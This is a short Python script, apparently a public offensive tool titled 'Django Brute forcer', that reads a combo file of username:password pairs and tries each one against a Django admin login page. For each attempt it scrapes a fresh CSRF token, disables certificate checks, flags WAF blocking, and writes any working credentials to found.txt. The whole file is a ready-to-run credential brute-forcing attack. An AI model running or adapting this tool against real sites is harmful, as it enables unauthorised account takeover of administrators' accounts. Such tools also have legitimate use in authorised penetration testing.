#!/usr/bin/env python
#
# Django Brute forcer
#
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
import bs4
import os.path
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",   required=True,help="Django Admin URL")
parser.add_argument("-f", "--file",  required=False,help="Combo file")
parser.add_argument("-p", "--proxy", required=False, help="Proxy for debugging")
parser.add_argument("-au", "--aurl", required=False, default="/admin/login/" ,help="Default /admin/login/")
args = parser.parse_args()
url = args.url
proxy = args.proxy
file = args.file
adminpath = args.aurl
durl = ""+url+""+adminpath+""


if proxy:
	proxy = args.proxy
else:
	proxy = ""


http_proxy = proxy
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }
            


def find_csrf_token(resp):
	soup = bs4.BeautifulSoup(resp, 'lxml')
	token = soup.find('input', attrs={"name":"csrfmiddlewaretoken"})['value']
	return token


def get_crsf(durl):
	paramsGet = {"next":adminpath}
	headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
	response = session.get(durl, params=paramsGet, headers=headers,verify=False, proxies=proxyDict,timeout=10,allow_redirects=False)
	if response.status_code == 200:
		resp = response.text
		token = find_csrf_token(resp)
		print ("[*] Token:"+token+" [*]")
		return token
	else:
		print("[-] Unable to get CRSF token check url [-]")
		sys.exit(0)


def try_login(durl,user,password,token):
	paramsGet = {"next":adminpath}
	paramsPost = {"csrfmiddlewaretoken":token,"next":adminpath,"password":password,"username":user}
	headers = {"Origin":durl,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0","Connection":"close","Referer":url,"Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
	cookies = {"csrftoken":token}
	response = session.post(durl, data=paramsPost, params=paramsGet, headers=headers, cookies=cookies,verify=False, proxies=proxyDict,timeout=10,allow_redirects=False)
	if response.status_code == 302:
		print("\n")
		print("********** Login Found ********** ")
		print("Django URL: %s" % durl)
		print("Django Username: %s" % user)
		print("Django Password: %s" % password)
		print("********************************* ")
		print ("\n")
		text_file = open("found.txt", "a")
		text_file.write("Django URL: %s\n" % durl)
		text_file.write("Django Username: %s\n" % user)
		text_file.write("Django Password: %s\n" % password)
		text_file.close()
		sys.exit(0)
	if response.status_code == 403:
		print("[-] Waf Detected Blocking Attempts [-]")
		sys.exit(0)
	else:
		print ("[-] Failed to login with user: "+user+" [-]")
		


if file:
	if os.path.exists(file):
		with open(file, 'r') as f:
			for line in f:
				c = line.replace("\n","")
				x = c.split(":")
				user = x[0]
				password = x[1]
				token = get_crsf(durl)
				try_login(durl,user,password,token)
			f.close()
